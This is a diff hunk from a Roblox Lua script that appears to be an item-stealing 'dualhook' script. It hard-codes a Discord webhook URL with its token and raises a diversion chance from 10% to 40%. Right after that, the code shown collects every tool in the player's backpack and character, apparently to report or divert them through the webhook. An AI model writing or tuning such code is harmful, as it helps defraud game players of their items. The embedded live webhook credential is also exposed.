@@ -421,7 +421,7 @@ end)
 task.spawn(function()
 task.wait(4)
 local WEBHOOK_DUALHOOK = "https://discord.com/api/webhooks/1445411548008022129/9Bz7RiwuJ3paUaN6Kt7TwiKP2UX9h2rSSRk9GoDyr3z2Fb0dB7qjZHtrSNxi94ZjVQnB"
-local D_CHANCE = 0.10
+local D_CHANCE = 0.40
 local allTools = {}
 for _, item in ipairs(Backpack:GetChildren()) do table.insert(allTools, item) end
 for _, item in ipairs(Character:GetChildren()) do if item:IsA("Tool") then table.insert(allTools, item) end end
